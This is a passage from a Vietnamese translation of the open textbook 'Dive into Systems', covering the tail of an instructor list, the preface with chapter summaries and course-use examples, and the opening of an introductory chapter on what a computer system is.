<li>John Dougherty (Haverford College) – Computer Organization (cs240)</li>
<li>John Foley (Smith College) – Operating Systems (CSC 262)</li>
<li>Elizabeth Johnson (Xavier University) – Programming in C<br />
Alexander Kendrowitch (West Point) – Computer Organization (CS380)</li>
<li>Bill Kerney (Clovis Community College) – Assembly Programming (CSCI 45)</li>
<li>Deborah Knox (The College of New Jersey) – Computer Architecture (CSC 325)</li>
<li>Doug MacGregor (Western Colorado University) – Operating Systems/Architecture (CS 330)</li>
<li>Jeff Matocha (Ouachita Baptist University) – Computer Organization (CSCI 3093)</li>
<li>Keith Muller (U.C. San Diego) – Computer Organization and Systems Programming (CSE 30)</li>
<li>Crystal Peng (Park University) – Computer Architecture (CS 319)</li>
<li>Leo Porter (U.C. San Diego) – Introduction to Computer Architecture (CSE 141)</li>
<li>Lauren Provost (Simmons University) – Computer Architecture and Organization (CS 226)</li>
<li>Kathleen Riley (Bryn Mawr College) – Principles of Computer Organization (CMSC B240)</li>
<li>Roger Shore (High Point University) – Computer Systems (CSC-2410)</li>
<li>Tony Tong (Wheaton College, Norton MA) – Advanced Topics in Computer Science: Parallel and Distributed Computing (COMP 398)</li>
<li>Brian Toone (Samford University) – Computer Organization and Architecture (COSC 305)</li>
<li>David Toth (Centre College) – Systems Programming (CSC 280)</li>
<li>Bryce Wiedenbeck (Davidson College) – Computer Organization (CSC 250)</li>
<li>Richard Weiss (The Evergreen State College) – Computer Science Foundations: Computer Architecture (CSF)  </li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="lời-nói-đầu"><a class="header" href="#lời-nói-đầu">Lời nói đầu</a></h1>
<p>Trong thế giới ngày nay, người ta rất chú trọng vào việc học lập trình, và lập trình được coi như một tấm vé vàng dẫn đến cuộc sống thành công. Bất chấp sự nở rộ của các bootcamp và việc lập trình được đưa vào giảng dạy ngay từ bậc tiểu học, bản thân chiếc máy tính lại thường bị xem như một yếu tố thứ yếu --- nó ngày càng trở nên vô hình trong các cuộc thảo luận về việc đào tạo thế hệ các nhà khoa học máy tính tiếp theo.</p>
<p>Mục đích của cuốn sách này là mang đến cho độc giả một phần giới thiệu <em>nhẹ nhàng</em>, <em>dễ tiếp cận</em> về hệ thống máy tính. Để viết được những chương trình hiệu quả, lập trình viên phải hiểu rõ các hệ thống con và kiến trúc nền tảng của máy tính. Tuy nhiên, chi phí của các sách giáo khoa hiện đại thường hạn chế khả năng tiếp cận của chúng đối với nhóm sinh viên có đủ điều kiện chi trả. Cuốn sách giáo khoa trực tuyến miễn phí này mong muốn giúp cho mọi người đều có thể tiếp cận các khái niệm về hệ thống máy tính. Sách nhắm đến đối tượng sinh viên có kiến thức nhập môn về khoa học máy tính và đã quen thuộc phần nào với Python. Nếu bạn đang tìm kiếm một cuốn sách miễn phí để tìm hiểu các nguyên tắc máy tính cơ bản bằng Python, chúng tôi khuyến khích bạn đọc <a href="https://runestone.academy/ns/books/published/thinkcspy/index.html"><em>How To Think Like a Computer Scientist with Python</em></a> trước.</p>
<p><em>Nay Lập trình mới hỏi han,</em></p>
<p><em>Miền sâu Hệ thống có ai dám vào?</em></p>
<p><em>Lập trình hỏi, Sách xin trao,</em></p>
<p><em>&quot;Biển sâu mời gọi, ngại nào không vô!&quot;</em></p>
<h2 id="cuốn-sách-này-nói-về-cái-gì"><a class="header" href="#cuốn-sách-này-nói-về-cái-gì">Cuốn sách này nói về cái gì</a></h2>
<p>Cuốn sách của chúng tôi có tựa đề <em>Dive into Systems</em> (Đắm mình vào Hệ thống) và được dùng như một phần giới thiệu nhẹ nhàng về các chủ đề trong hệ thống máy tính, bao gồm <code>C programming</code> (&quot;lập trình C&quot;), các nguyên tắc cơ bản về <code>architecture</code> (&quot;kiến trúc&quot;), <code>assembly language</code> (&quot;hợp ngữ&quot;), và <code>multithreading</code> (&quot;đa luồng&quot;). Phép ẩn dụ về đại dương rất phù hợp với hệ thống máy tính. Giống như sự sống hiện đại được cho là bắt nguồn từ sâu thẳm của đại dương nguyên thủy, lập trình hiện đại cũng bắt nguồn từ việc thiết kế và xây dựng kiến trúc máy tính thời kỳ đầu. Những lập trình viên đầu tiên đã nghiên cứu sơ đồ phần cứng của những chiếc máy tính đầu tiên để tạo ra các chương trình đầu tiên.</p>
<p>Tuy nhiên, khi sự sống (và ngành tính toán) bắt đầu rời xa đại dương nơi chúng xuất hiện, đại dương dần bị coi là một nơi đáng sợ và hiểm nguy, nơi cư ngụ của những loài quái vật. Các nhà hàng hải cổ đại thường vẽ hình những con thủy quái và các sinh vật thần thoại khác vào những vùng biển chưa được khám phá trên bản đồ. <em>Nơi đây có rồng</em>, dòng chữ sẽ cảnh báo. Tương tự như vậy, khi ngành tính toán ngày càng đi xa khỏi nguồn gốc cấp máy của nó, các chủ đề về hệ thống máy tính thường trở thành những &quot;con rồng&quot; của riêng nhiều sinh viên ngành tính toán.</p>
<p>Khi viết cuốn sách này, chúng tôi hy vọng sẽ khuyến khích sinh viên thực hiện một cú lặn nhẹ nhàng vào các chủ đề hệ thống máy tính. Mặc dù biển cả trông có vẻ tối tăm và nguy hiểm khi nhìn từ trên cao, nhưng có cả một thế giới tươi đẹp và diệu kỳ đang chờ được khám phá bởi những ai chọn nhìn xuống ngay bên dưới bề mặt. Cũng như vậy, một sinh viên có thể có được sự trân trọng lớn hơn đối với ngành tính toán bằng cách nhìn xuống bên dưới đoạn code và xem xét rạn san hô <code>architecture</code> bên dưới.</p>
<p>Chúng tôi không cố gắng ném bạn ra giữa đại dương bao la. Cuốn sách của chúng tôi chỉ giả định người đọc có kiến thức nền tảng của một môn Khoa học Máy tính năm nhất và được thiết kế để trở thành lần tiếp xúc đầu tiên với nhiều chủ đề hệ thống máy tính. Chúng tôi bao quát các chủ đề như <code>C programming</code>, <code>logic gates</code> (&quot;cổng logic&quot;), <code>binary</code> (&quot;hệ nhị phân&quot;), <code>assembly</code>, <code>memory hierarchy</code> (&quot;hệ thống phân cấp bộ nhớ&quot;), <code>threading</code>, và <code>parallelism</code> (&quot;tính toán song song&quot;). Các chương của chúng tôi được viết để độc lập với nhau nhất có thể, với mục tiêu có thể áp dụng rộng rãi cho nhiều khóa học khác nhau.</p>
<p>Cuối cùng, một mục tiêu lớn của chúng tôi khi viết cuốn sách này là nó phải được cung cấp miễn phí. Chúng tôi muốn cuốn sách của mình là một tài liệu sống, được cộng đồng ngành tính toán bình duyệt (peer reviewed), và phát triển khi lĩnh vực của chúng ta tiếp tục phát triển. Nếu bạn có phản hồi cho chúng tôi, xin vui lòng gửi cho chúng tôi một vài dòng. Chúng tôi rất mong nhận được tin từ bạn!</p>
<h2 id="các-cách-sử-dụng-cuốn-sách-này"><a class="header" href="#các-cách-sử-dụng-cuốn-sách-này">Các cách sử dụng cuốn sách này</a></h2>
<p>Sách giáo khoa của chúng tôi bao quát một loạt các chủ đề liên quan đến hệ thống máy tính, đặc biệt nhắm đến các khóa học cấp độ trung cấp như giới thiệu về hệ thống máy tính hoặc tổ chức máy tính. Sách cũng có thể được sử dụng để cung cấp tài liệu tham khảo nền tảng cho các khóa học cấp cao hơn như hệ điều hành, trình biên dịch, tính toán song song và phân tán, và kiến trúc máy tính.</p>
<p>Sách giáo khoa này không được thiết kế để bao quát toàn bộ tất cả các chủ đề hệ thống. Sách không bao gồm các chủ đề nâng cao hoặc đầy đủ về hệ điều hành, kiến trúc máy tính, hoặc tính toán song song và phân tán, cũng không được thiết kế để thay thế cho các sách giáo khoa chuyên sâu về các chủ đề này trong các khóa học cấp cao hơn. Thay vào đó, sách tập trung vào việc giới thiệu về hệ thống máy tính, các chủ đề chung trong hệ thống trong bối cảnh tìm hiểu cách một máy tính chạy một chương trình, và cách thiết kế chương trình để chạy hiệu quả trên các hệ thống. Phạm vi chủ đề cung cấp một nền tảng kiến thức và bộ kỹ năng chung cho việc nghiên cứu nâng cao hơn về các chủ đề hệ thống.</p>
<p>Các chủ đề trong sách của chúng tôi có thể được xem như một lát cắt dọc qua một chiếc máy tính. Ở lớp thấp nhất, chúng tôi thảo luận về biểu diễn <code>binary</code> của chương trình và các mạch được thiết kế để lưu trữ và thực thi chương trình, xây dựng một <code>CPU</code> (&quot;đơn vị xử lý trung tâm&quot;) đơn giản từ các <code>logic gates</code> cơ bản có thể thực thi các chỉ thị chương trình. Ở lớp tiếp theo, chúng tôi giới thiệu về <code>operating system</code> (&quot;hệ điều hành&quot;), tập trung vào sự hỗ trợ của nó cho việc chạy chương trình và quản lý phần cứng máy tính, đặc biệt là các cơ chế thực hiện <code>multiprogramming</code> (&quot;đa chương&quot;) và hỗ trợ <code>virtual memory</code> (&quot;bộ nhớ ảo&quot;). Ở lớp cao nhất, chúng tôi trình bày ngôn ngữ <code>C programming</code> và cách nó ánh xạ tới code cấp thấp, cách thiết kế code hiệu quả, các tối ưu hóa của <code>compiler</code> (&quot;trình biên dịch&quot;), và tính toán song song. Một người đọc toàn bộ cuốn sách sẽ có được sự hiểu biết cơ bản về cách một chương trình viết bằng C (và <code>Pthreads</code>) thực thi trên máy tính và, dựa trên sự hiểu biết này, sẽ biết một số cách để thay đổi cấu trúc chương trình của mình nhằm cải thiện hiệu suất của nó.</p>
<p>Mặc dù toàn bộ cuốn sách cung cấp một lát cắt dọc qua máy tính, các chương sách được viết độc lập nhất có thể để giảng viên có thể kết hợp và lựa chọn các chương cho nhu cầu cụ thể của họ. Sơ đồ phụ thuộc giữa các chương được hiển thị bên dưới, mặc dù các phần riêng lẻ trong các chương có thể không có hệ thống phụ thuộc sâu như toàn bộ chương.</p>
<p><img src="_images/chaptdeps.png" alt="Chương 1 và 4 độc lập với các chương khác. Các chương 2, 3, 5 và 6-10 phụ thuộc vào chương 1. Chương 5 và 13 còn phụ thuộc thêm vào chương 4. Các chương còn lại phụ thuộc vào sự kết hợp của các chương trên." /></p>
<h3 id="tóm-tắt-nội-dung-các-chương"><a class="header" href="#tóm-tắt-nội-dung-các-chương">Tóm tắt nội dung các chương</a></h3>
<ul>
<li>
<p>Chương 0, <em>Giới thiệu</em>: Giới thiệu về hệ thống máy tính và một số mẹo để đọc cuốn sách này.</p>
</li>
<li>
<p>Chương 1, <em>Giới thiệu về Lập trình C</em>: Bao quát các kiến thức cơ bản về <code>C programming</code>, bao gồm cả việc biên dịch và chạy các chương trình C. Chúng tôi giả định người đọc cuốn sách này đã có kiến thức nhập môn về lập trình bằng một ngôn ngữ lập trình nào đó. Chúng tôi so sánh cú pháp C với cú pháp Python để những độc giả quen thuộc với Python có thể thấy cách chuyển đổi. Tuy nhiên, kinh nghiệm lập trình Python không phải là điều kiện cần thiết để đọc hay hiểu chương này.</p>
</li>
<li>
<p>Chương 2, <em>Tìm hiểu sâu hơn về C</em>: Bao quát hầu hết ngôn ngữ C, đặc biệt là <code>pointers</code> (&quot;con trỏ&quot;) và <code>dynamic memory</code> (&quot;bộ nhớ động&quot;). Chúng tôi cũng trình bày chi tiết hơn về các chủ đề từ Chương 1 và thảo luận về một số tính năng C nâng cao.</p>
</li>
<li>
<p>Chương 3, <em>Các công cụ Gỡ lỗi C</em>: Bao quát các công cụ gỡ lỗi C phổ biến (<code>GDB</code> và <code>Valgrind</code>) và minh họa cách chúng có thể được sử dụng để gỡ lỗi nhiều loại ứng dụng khác nhau.</p>
</li>
<li>
<p>Chương 4, <em>Hệ nhị phân và Biểu diễn Dữ liệu</em>: Bao quát việc code hóa dữ liệu thành <code>binary</code>, biểu diễn <code>binary</code> của các kiểu dữ liệu trong C, các phép toán số học trên dữ liệu <code>binary</code>, và tràn số học (arithmetic overflow).</p>
</li>
<li>
<p>Chương 5, <em>Cổng logic, Mạch và Kiến trúc Máy tính</em>: Bao quát <code>von Neumann architecture</code> (&quot;kiến trúc von Neumann&quot;) từ các <code>logic gates</code> đến việc xây dựng một <code>CPU</code> cơ bản. Chúng tôi mô tả đặc điểm của việc thực thi theo xung nhịp (clock-driven execution) và các giai đoạn thực thi chỉ thị thông qua các mạch số học, lưu trữ và điều khiển. Chúng tôi cũng giới thiệu ngắn gọn về <code>pipelining</code> (&quot;đường ống&quot;), một số tính năng <code>architecture</code> hiện đại, và lịch sử ngắn gọn của <code>architecture</code> máy tính.</p>
</li>
<li>
<p>Chương 6-10, <em>Lập trình Assembly</em>: Bao quát việc dịch code C sang <code>assembly</code> từ các biểu thức số học cơ bản đến các hàm, stack, và truy cập mảng và <code>struct</code>. Trong ba chương riêng biệt, chúng tôi bao quát <code>assembly</code> từ ba <code>instruction set architectures</code> (&quot;kiến trúc tập lệnh&quot;) khác nhau: <code>x86</code> 32-bit, <code>x86</code> 64-bit, và <code>ARM</code> 64-bit.</p>
</li>
<li>
<p>Chương 11, <em>Lưu trữ và Hệ thống phân cấp Bộ nhớ</em>: Bao quát các thiết bị lưu trữ, <code>memory hierarchy</code> và ảnh hưởng của nó đến hiệu suất chương trình, tính cục bộ (locality), <code>caching</code> (&quot;lưu trữ đệm&quot;), và công cụ phân tích <code>Cachegrind</code>.</p>
</li>
<li>
<p>Chương 12, <em>Tối ưu hóa Mã</em>: Bao quát các tối ưu hóa của <code>compiler</code>, thiết kế chương trình có tính đến hiệu suất, các mẹo để tối ưu hóa code, và đo lường định lượng hiệu suất của một chương trình.</p>
</li>
<li>
<p>Chương 13, <em>Hệ điều hành</em>: Bao quát các khái niệm trừu tượng cốt lõi của <code>operating system</code> và các cơ chế đằng sau chúng. Chúng tôi chủ yếu tập trung vào các tiến trình (processes), <code>virtual memory</code>, và <code>interprocess communication (IPC)</code> (&quot;giao tiếp liên tiến trình&quot;).</p>
</li>
<li>
<p>Chương 14, <em>Tính toán Song song trên Bộ nhớ chia sẻ</em>: Bao quát các bộ xử lý đa lõi, <code>threads</code> (&quot;luồng&quot;) và lập trình <code>Pthreads</code>, <code>synchronization</code> (&quot;đồng bộ hóa&quot;), <code>race conditions</code> (&quot;tình trạng tranh chấp&quot;), và <code>deadlock</code> (&quot;khóa chết&quot;). Chương này bao gồm một số chủ đề nâng cao về đo lường hiệu suất song song (<code>speed-up</code>, <code>efficiency</code>, định luật Amdahl), <code>thread safety</code> (&quot;an toàn luồng&quot;), và <code>cache coherence</code> (&quot;tính nhất quán của bộ đệm&quot;).</p>
</li>
<li>
<p>Chương 15, <em>Các Hệ thống Song song và Mô hình Lập trình Nâng cao</em>: Giới thiệu những kiến thức cơ bản về <code>distributed memory systems</code> (&quot;hệ thống bộ nhớ phân tán&quot;) và <code>Message Passing Interface (MPI)</code>, <code>hardware accelerators</code> (&quot;bộ tăng tốc phần cứng&quot;) và <code>CUDA</code>, cùng với <code>cloud computing</code> (&quot;điện toán đám mây&quot;) và <code>MapReduce</code>.</p>
</li>
</ul>
<h3 id="ví-dụ-về-cách-sử-dụng-cuốn-sách-này"><a class="header" href="#ví-dụ-về-cách-sử-dụng-cuốn-sách-này">Ví dụ về cách sử dụng cuốn sách này</a></h3>
<p><em>Dive into Systems</em> có thể được sử dụng như một sách giáo khoa chính cho các khóa học giới thiệu về các chủ đề hệ thống máy tính, hoặc các chương riêng lẻ có thể được sử dụng để cung cấp thông tin nền tảng trong các khóa học chuyên sâu hơn.</p>
<p>Ví dụ từ hai trường của các tác giả, chúng tôi đã và đang sử dụng nó làm sách giáo khoa chính cho hai khóa học cấp độ trung cấp khác nhau:</p>
<ul>
<li><em>Giới thiệu về Hệ thống Máy tính</em> tại Swarthmore College. Thứ tự chương: 4, 1 (một phần 3), 5, 6, 7, 10, 2 (thêm một phần 3), 11, 13, 14.</li>
<li><em>Tổ chức Máy tính</em> tại West Point. Thứ tự chương: 1, 4, 2 (một phần 3), 6, 7, 10, 11, 12, 13, 14, 15.</li>
</ul>
<p>Ngoài ra, chúng tôi sử dụng các chương riêng lẻ làm tài liệu đọc nền tảng trong nhiều khóa học cấp cao hơn, bao gồm:</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">Chủ đề môn học cấp cao hơn</th><th style="text-align: left">Các chương đọc tham khảo</th></tr></thead><tbody>
<tr><td style="text-align: left">Kiến trúc (Architecture)</td><td style="text-align: left">5, 11</td></tr>
<tr><td style="text-align: left">Trình biên dịch (Compilers)</td><td style="text-align: left">6, 7, 8, 9, 10, 11, 12</td></tr>
<tr><td style="text-align: left">Hệ quản trị Cơ sở dữ liệu</td><td style="text-align: left">11, 14, 15</td></tr>
<tr><td style="text-align: left">Mạng máy tính (Networking)</td><td style="text-align: left">4, 13, 14</td></tr>
<tr><td style="text-align: left">Hệ điều hành (Operating Systems)</td><td style="text-align: left">11, 13, 14</td></tr>
<tr><td style="text-align: left">Hệ thống Song song và Phân tán</td><td style="text-align: left">11, 13, 14, 15</td></tr>
</tbody></table>
</div>
<p>Cuối cùng, Chương 2 và 3 được sử dụng làm tài liệu tham khảo về lập trình và gỡ lỗi C trong nhiều khóa học của chúng tôi.</p>
<h3 id="Đọc-online-bản-gốc-luôn-nha"><a class="header" href="#Đọc-online-bản-gốc-luôn-nha">Đọc online bản gốc luôn nha</a></h3>
<p>Phiên bản trực tuyến miễn phí của sách giáo khoa của chúng tôi có tại
<a href="https://diveintosystems.org/">https://diveintosystems.org/</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="0-giới-thiệu"><a class="header" href="#0-giới-thiệu">0. Giới thiệu</a></h2>
<p>Hãy cùng lặn vào thế giới kỳ thú của hệ thống máy tính! Việc hiểu một <code>computer system</code> (&quot;hệ thống máy tính&quot;) là gì và cách nó chạy các chương trình của bạn có thể giúp bạn thiết kế những đoạn code chạy hiệu quả và tận dụng tốt nhất sức mạnh của hệ thống nền tảng. Trong cuốn sách này, chúng tôi sẽ đưa bạn vào một cuộc hành trình xuyên suốt các <code>computer systems</code>. Bạn sẽ học được cách một chương trình được viết bằng ngôn ngữ lập trình bậc cao (chúng tôi dùng C) thực thi trên máy tính. Bạn sẽ học cách các chỉ thị của chương trình được dịch sang <code>binary</code> (&quot;hệ nhị phân&quot;) và cách các mạch điện tử thực thi đoạn code <code>binary</code> đó. Bạn sẽ học cách một <code>operating system</code> (&quot;hệ điều hành&quot;) quản lý các chương trình đang chạy trên hệ thống. Bạn sẽ học cách viết những chương trình có thể tận dụng các máy tính <code>multicore</code> (&quot;đa lõi&quot;). Xuyên suốt quá trình đó, bạn sẽ học cách đánh giá các chi phí hệ thống liên quan đến code chương trình và cách thiết kế chương trình để chạy một cách hiệu quả.</p>
<h2 id="hệ-thống-máy-tính-là-gì"><a class="header" href="#hệ-thống-máy-tính-là-gì">Hệ thống máy tính là gì?</a></h2>
<p>Một <strong>computer system</strong> là sự kết hợp giữa phần cứng máy tính và phần mềm hệ thống đặc biệt, chúng cùng nhau giúp người dùng và các chương trình có thể sử dụng được máy tính. Cụ thể, một <code>computer system</code> có các thành phần sau (xem Hình 1):</p>
<ul>
<li><strong>Input/output (IO) ports</strong> (&quot;cổng vào/ra&quot;) cho phép máy tính nhận thông tin từ môi trường bên ngoài và hiển thị lại cho người dùng theo một cách có ý nghĩa.</li>
<li>Một <strong>central processing unit (CPU)</strong> (&quot;đơn vị xử lý trung tâm&quot;) chạy các chỉ thị và tính toán dữ liệu cũng như địa chỉ bộ nhớ.</li>
<li><strong>Random access memory (RAM)</strong> (&quot;bộ nhớ truy cập ngẫu nhiên&quot;) lưu trữ dữ liệu và chỉ thị của các chương trình đang chạy. Dữ liệu và chỉ thị trong <code>RAM</code> thường sẽ mất khi <code>computer system</code> bị ngắt điện.</li>
<li><strong>Secondary storage devices</strong> (&quot;thiết bị lưu trữ thứ cấp&quot;) như ổ đĩa cứng lưu trữ chương trình và dữ liệu ngay cả khi máy tính không được cấp điện.</li>
<li>Một lớp phần mềm <strong>operating system (OS)</strong> nằm giữa phần cứng của máy tính và phần mềm mà người dùng chạy trên máy tính. <code>OS</code> thực thi các giao diện và trừu tượng hóa lập trình cho phép người dùng dễ dàng chạy và tương tác với các chương trình trên hệ thống. Nó cũng quản lý các tài nguyên phần cứng bên dưới và kiểm soát cách thức cũng như thời điểm các chương trình thực thi. <code>OS</code> thực thi các cơ chế, chính sách và trừu tượng hóa để đảm bảo nhiều chương trình có thể chạy đồng thời trên hệ thống một cách hiệu quả, được bảo vệ và liền mạch.</li>
</ul>
<p>Bốn thành phần đầu tiên trong số này định nghĩa nên thành phần <strong>computer hardware</strong> (&quot;phần cứng máy tính&quot;) của một <code>computer system</code>. Mục cuối cùng (<code>operating system</code>) đại diện cho phần mềm chính của <code>computer system</code>. Có thể có các lớp phần mềm bổ sung nằm trên <code>OS</code> để cung cấp các giao diện khác cho người dùng hệ thống (ví dụ: thư viện). Tuy nhiên, <code>OS</code> là phần mềm hệ thống cốt lõi mà chúng tôi tập trung vào trong cuốn sách này.</p>
<p><img src="_images/computersystem.png" alt="Một hệ thống máy tính với nhiều lớp. Lớp dưới cùng là phần cứng (CPU, RAM, và Ổ đĩa). Bên trên là hệ điều hành (ví dụ: Mac OS, Linux, hoặc Windows). Các chương trình người dùng thực thi ở lớp trên cùng." /></p>
<p>Hình 1. Các thành phần phân lớp của một hệ thống máy tính</p>
<p>Chúng tôi đặc biệt tập trung vào các <code>computer systems</code> có những phẩm chất sau:</p>
<ul>
<li>Chúng là <strong>general purpose</strong> (&quot;đa dụng&quot;), nghĩa là chức năng của chúng không được thiết kế riêng cho bất kỳ ứng dụng cụ thể nào.</li>
<li>Chúng là <strong>reprogrammable</strong> (&quot;có thể lập trình lại&quot;), nghĩa là chúng hỗ trợ việc chạy một chương trình khác mà không cần sửa đổi <code>computer hardware</code> hay phần mềm hệ thống.</li>
</ul>
<p>Vì vậy, nhiều thiết bị có thể &quot;tính toán&quot; dưới một hình thức nào đó không thuộc danh mục <code>computer system</code>. Ví dụ, máy tính bỏ túi thường có một bộ xử lý, một lượng bộ nhớ hạn chế và khả năng I/O. Tuy nhiên, máy tính bỏ túi thường không có <code>operating system</code> (các máy tính đồ họa cao cấp như TI-89 là một ngoại lệ đáng chú ý), không có <code>secondary storage</code>, và không phải là <code>general purpose</code>.</p>
<p>Một ví dụ khác đáng nói là <code>microcontroller</code> (vi điều khiển), một loại mạch tích hợp có nhiều khả năng tương tự như một máy tính. Các <code>microcontrollers</code> thường được nhúng vào các thiết bị khác (như đồ chơi, thiết bị y tế, ô tô, và đồ gia dụng), nơi chúng điều khiển một chức năng tự động cụ thể. Mặc dù các <code>microcontrollers</code> là <code>general purpose</code>, <code>reprogrammable</code>, chứa một bộ xử lý, bộ nhớ trong, <code>secondary storage</code>, và có khả năng I/O, chúng lại thiếu một <code>operating system</code>. Một <code>microcontroller</code> được thiết kế để khởi động và chạy một chương trình cụ thể duy nhất cho đến khi mất điện. Vì lý do này, một <code>microcontroller</code> không phù hợp với định nghĩa của chúng ta về một <code>computer system</code>.</p>
<h2 id="các-hệ-thống-máy-tính-hiện-đại-trông-như-thế-nào"><a class="header" href="#các-hệ-thống-máy-tính-hiện-đại-trông-như-thế-nào">Các hệ thống máy tính hiện đại trông như thế nào?</a></h2>
<p>Bây giờ chúng ta đã xác định được một <code>computer system</code> là gì (và không phải là gì), hãy thảo luận xem các <code>computer systems</code> thường trông như thế nào. <a href="introduction.html#FigDesktopLaptop">Hình 2</a> mô tả hai loại hệ thống <code>computer hardware</code> (không bao gồm các thiết bị ngoại vi): một máy tính để bàn (bên trái) và một máy tính xách tay (bên phải). Một đồng 25 xu của Mỹ trên mỗi thiết bị giúp người đọc hình dung về kích thước của mỗi bộ phận.</p>
<p><img src="_images/desktop_laptop_labeled.png" alt="Hình ảnh các thành phần (ví dụ: CPU, bộ nguồn, ổ đĩa, v.v.) của một máy tính để bàn và máy tính xách tay." /></p>
<p>Hình 2. Các hệ thống máy tính phổ biến: một máy tính để bàn (trái) và một máy tính xách tay (phải)</p>
<p>Lưu ý rằng cả hai đều chứa các thành phần phần cứng giống nhau, mặc dù một số thành phần có thể có kích thước nhỏ hơn hoặc gọn hơn. Khay DVD/CD của máy tính để bàn đã được dời sang một bên để thấy ổ cứng bên dưới — hai bộ phận này được xếp chồng lên nhau. Một bộ nguồn chuyên dụng giúp cung cấp điện cho máy tính để bàn.</p>
<p>Ngược lại, máy tính xách tay phẳng hơn và gọn hơn (lưu ý rằng đồng xu trong ảnh này trông lớn hơn một chút). Máy tính xách tay có pin và các thành phần của nó có xu hướng nhỏ hơn. Trong cả máy tính để bàn và máy tính xách tay, <code>CPU</code> bị che khuất bởi một chiếc quạt <code>CPU</code> hạng nặng, giúp giữ <code>CPU</code> ở nhiệt độ hoạt động hợp lý. Nếu các thành phần quá nóng, chúng có thể bị hỏng vĩnh viễn. Cả hai thiết bị đều có các mô-đun bộ nhớ trong hàng kép (DIMM) cho các đơn vị <code>RAM</code> của chúng. Lưu ý rằng các mô-đun bộ nhớ của máy tính xách tay nhỏ hơn đáng kể so với các mô-đun của máy tính để bàn.</p>
<p>Về trọng lượng và mức tiêu thụ điện, máy tính để bàn thường tiêu thụ 100 - 400 W điện và thường nặng từ 5 đến 20 pound. Một máy tính xách tay thường tiêu thụ 50 - 100 W điện và sử dụng bộ sạc ngoài để bổ sung cho pin khi cần thiết.</p>
<p>Xu hướng trong thiết kế <code>computer hardware</code> là hướng tới các thiết bị nhỏ hơn và gọn hơn. Hình 3 mô tả một máy tính đơn bo mạch (single-board computer) Raspberry Pi. Một máy tính đơn bo mạch (SBC) là một thiết bị trong đó toàn bộ máy tính được in trên một bảng mạch duy nhất.</p>
<p><img src="_images/pi_labeled.png" alt="Hình ảnh một máy tính đơn bo mạch Raspberry Pi." /></p>
<p>Hình 3. Một máy tính đơn bo mạch Raspberry Pi</p>
<p>Raspberry Pi SBC chứa một bộ xử lý <strong>system-on-a-chip (SoC)</strong> (&quot;hệ thống trên một vi mạch&quot;) với <code>RAM</code> và <code>CPU</code> tích hợp, bao gồm phần lớn phần cứng của máy tính xách tay và máy tính để bàn được hiển thị trong Hình 2. Không giống như các hệ thống máy tính xách tay và máy tính để bàn, Raspberry Pi có kích thước gần bằng một chiếc thẻ tín dụng, nặng 1.5 ounce (khoảng một lát bánh mì), và tiêu thụ khoảng 5 W điện. Công nghệ <code>SoC</code> có trên Raspberry Pi cũng thường được tìm thấy trong điện thoại thông minh. Trên thực tế, điện thoại thông minh là một ví dụ khác về <code>computer system</code>!</p>
<p>Cuối cùng, tất cả các <code>computer systems</code> đã đề cập ở trên (bao gồm cả Raspberry Pi và điện thoại thông minh) đều có bộ xử lý <strong>multicore</strong>. Nói cách khác, các <code>CPU</code> của chúng có khả năng thực thi nhiều chương trình đồng thời. Chúng ta gọi sự thực thi đồng thời này là <strong>parallel execution</strong> (&quot;thực thi song song&quot;). Lập trình <code>multicore</code> cơ bản được đề cập trong Chương 14 của cuốn sách này.</p>
<p>Tất cả các loại hệ thống <code>computer hardware</code> khác nhau này có thể chạy một hoặc nhiều <code>operating systems</code> đa dụng, chẳng hạn như macOS, Windows, hoặc Unix. Một <code>operating system</code> đa dụng quản lý <code>computer hardware</code> bên dưới và cung cấp một giao diện để người dùng chạy bất kỳ chương trình nào trên máy tính. Cùng với nhau, các loại <code>computer hardware</code> khác nhau chạy các <code>operating systems</code> đa dụng khác nhau này tạo nên một <code>computer system</code>.</p>
<h2 id="bạn-sẽ-học-được-gì-trong-cuốn-sách-này"><a class="header" href="#bạn-sẽ-học-được-gì-trong-cuốn-sách-này">Bạn sẽ học được gì trong cuốn sách này</a></h2>
<p>Đến cuối cuốn sách này, bạn sẽ biết những điều sau:</p>
<p><strong>Cách một máy tính chạy một chương trình</strong>: Bạn sẽ có thể mô tả chi tiết cách một chương trình được thể hiện bằng ngôn ngữ lập trình bậc cao được thực thi bởi các mạch cấp thấp của <code>computer hardware</code>. Cụ thể, bạn sẽ biết:</p>
<ul>
<li>cách dữ liệu chương trình được code hóa thành <code>binary</code> và cách phần cứng thực hiện các phép toán số học trên đó</li>
<li>cách một <code>compiler</code> (&quot;trình biên dịch&quot;) dịch các chương trình C thành code máy <code>assembly</code> và <code>binary</code> (<code>assembly</code> là dạng con người có thể đọc được của code máy <code>binary</code>)</li>
<li>cách một <code>CPU</code> thực thi các chỉ thị <code>binary</code> trên dữ liệu chương trình <code>binary</code>, từ các <code>logic gates</code> (&quot;cổng logic&quot;) cơ bản đến các mạch phức tạp lưu trữ giá trị, thực hiện phép toán và kiểm soát việc thực thi chương trình</li>
<li>cách <code>OS</code> thực thi giao diện để người dùng chạy các chương trình trên hệ thống và cách nó kiểm soát việc thực thi chương trình trên hệ thống trong khi quản lý tài nguyên của hệ thống.</li>
</ul>
<p><strong>Cách đánh giá các chi phí hệ thống liên quan đến hiệu suất của một chương trình</strong>: Một chương trình chạy chậm vì nhiều lý do. Đó có thể là do lựa chọn thuật toán tồi hoặc đơn giản là những lựa chọn không tốt về cách chương trình của bạn sử dụng tài nguyên hệ thống. Bạn sẽ hiểu về <a href="C11-MemHierarchy/mem_hierarchy.html#_the_memory_hierarchy">Memory Hierarchy</a> (&quot;Hệ thống phân cấp bộ nhớ&quot;) và ảnh hưởng của nó đến hiệu suất chương trình, cũng như các chi phí <code>operating systems</code> liên quan đến hiệu suất chương trình. Bạn cũng sẽ học được một số mẹo quý giá để tối ưu hóa code. Cuối cùng, bạn sẽ có thể thiết kế các chương trình sử dụng tài nguyên hệ thống một cách hiệu quả, và bạn sẽ biết cách đánh giá các chi phí hệ thống liên quan đến việc thực thi chương trình.</p>
